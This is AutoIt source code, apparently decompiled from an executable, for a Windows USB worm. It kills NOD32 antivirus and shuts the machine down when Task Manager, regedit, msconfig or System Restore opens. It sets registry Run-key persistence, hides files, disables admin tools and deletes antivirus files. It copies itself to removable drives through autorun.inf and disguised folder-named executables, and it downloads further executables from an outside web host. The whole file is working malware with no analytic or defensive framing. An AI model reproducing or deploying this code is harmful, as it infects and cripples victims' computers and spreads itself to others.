; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\Hacked\HA1\VI\System.au3>
; ----------------------------------------------------------------------------

if ProcessExists("system.exe") = True Then
	Run(@WindowsDir & "\explorer.exe")
EndIf
While 1
	#NoTrayIcon
	Opt("TrayIconHide", 1)
	; End process
	if ProcessExists("msconfig.exe") = True Then
		Shutdown (6)
	EndIf
	if ProcessExists("rstrui.exe") = True Then
		Shutdown (6)
	EndIf
	if ProcessExists("regedit.exe") = True Then
		Shutdown (6)
	EndIf
	if ProcessExists("taskmgr.exe") = True Then
		Shutdown (6)
	EndIf
	ProcessClose("winsystem.exe")
	ProcessClose("handydriver.exe")
	ProcessClose("kerneldrive.exe")
	ProcessClose("Wscript.exe")
	ProcessClose("cmd.exe")
	ProcessClose("nod32krn.exe")
	ProcessClose("nod32kui.exe")
	; Regedit Write
	$rg1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	$rg2 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"
	RegWrite ($rg1,"SYS1","REG_SZ",@SystemDir &"\system.exe")
	RegWrite ($rg1,"SYS2","REG_SZ",@SystemDir &"\bad1.exe")
	RegWrite ($rg1,"SYS3","REG_SZ",@SystemDir &"\bad2.exe")
	RegWrite ($rg1,"SYS4","REG_SZ",@SystemDir &"\bad3.exe")
	RegWrite ($rg1,"Msmsgs","REG_SZ",@SystemDir &"\Msmsgs.exe")
	Regwrite ($rg2 & "\Explorer\Advanced","SuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","ShowSuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","HideFileExt","REG_DWORD","1")
	Regwrite ($rg2 & "\Explorer\Advanced","Hidden","REG_DWORD","2")
	RegWrite ($rg2 & "\Policies\Explorer","NoFind","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\Explorer","NoFolderOptions","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\Explorer","NoDriveTypeAutoRun","REG_DWORD","91")
	Regwrite ($rg2 & "\Policies\system","DisableTaskMgr","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\system","DisableRegistryTools","REG_DWORD","1")
	; Regedit Delete
	Regdelete("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main","Window Title")
	Regdelete("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NOD32krn","ImagePath")
	Regdelete("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nod32drv","ImagePath")
	RegDelete("HKEY_CLASSES_ROOT\lnkfile\isShortcut")
	; Autorun
	if FileExists(@WindowsDir &"\autorun.inf") <> True Then
		$atr = fileOpen(@WindowsDir & "\autorun.inf",2)
		FileWrite($atr, "[autorun]" & @CRLF)
		FileWrite($atr, "open=system.exe" & @CRLF)
		FileWrite($atr, "shellexecute=system.exe" &@CRLF)
		FileWrite($atr, "shell\Explore\command=system.exe" &@CRLF)
		FileWrite($atr, "shell\Open\command=system.exe" &@CRLF)
		FileWrite($atr, "shell=Explore")
		FileClose($atr)
		FileSetAttrib(@WindowsDir & "\autorun.inf","+R+H+S")
	EndIf
	; Flashdrive
	$path1 = DriveGetDrive ("REMOVABLE")
	if Not @error Then
		for $d = 1 to $path1[0]
			$flashdrive = $path1[$d]
			if $flashdrive <> "A:" and DriveGetFileSystem($flashdrive) <> "" Then
				FileSetAttrib($flashdrive & "\autorun.inf","-R")
				FileCopy(@ScriptFullPath,$flashdrive &"\system.exe")
				FileCopy(@WindowsDir & "\autorun.inf",$flashdrive & "\autorun.inf",1)
				FileSetAttrib($flashdrive & "\autorun.inf","+R+H+S")
				FileSetAttrib($flashdrive & "\system.exe","+R+H+S")
				; Search1
				$search1 = FileFindFirstFile($flashdrive & "\*.")
				if $search1 <> -1 Then
					$file1 = FileFindNextFile($search1)
					FileCopy(@scriptfullpath,$flashdrive &"\"& $file1 &".exe")
					FileSetAttrib($flashdrive &"\"& $file1,"+H")
					FileSetAttrib($flashdrive &"\"& $file1 &".exe","-H-S")
				EndIf
				FileClose($search1)
			EndIf
		Next
	EndIf
	; Harddisk Drive
	$path2 = DriveGetDrive ("FIXED")
	if Not @error Then
		for $f = 1 to $path2[0]
			$drive = $path2[$f]
			FileSetAttrib($drive & "\autorun.inf","-R")
			FileDelete($drive & "\autorun.inf")
		Next
	EndIf
	; ETC
	FileCopy(@ScriptFullPath,@SystemDir & "\msmsgs.exe")
	FileCopy(@scriptfullpath,@programfilesdir &"\ESET\nod32.exe")
	FileSetAttrib(@SystemDir & "\wininit.exe","-R")
	FileSetAttrib(@SystemDir & "\msmsgs.exe","+R+H+S")
	FileDelete(@systemdir &"\wininit.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32kui.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32krn.exe")
	;download file
	$webpath = "http://ppt.th.gs/web-p/pt/file"
	if FileExists(@systemdir & "\bad1.exe") <> True Then
		InetGet($webpath & "/bad1.exe",@SystemDir & "\bad1.exe")
	EndIf
	if FileExists(@systemdir & "\bad2.exe") <> True Then
		InetGet($webpath & "/bad2.exe",@SystemDir & "\bad2.exe")
	EndIf
	if FileExists(@systemdir & "\bad3.exe") <> True Then
		InetGet($webpath & "/bad3.exe",@SystemDir & "\bad3.exe")
	EndIf
	Sleep(4000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\Hacked\HA1\VI\System.au3>
; ----------------------------------------------------------------------------

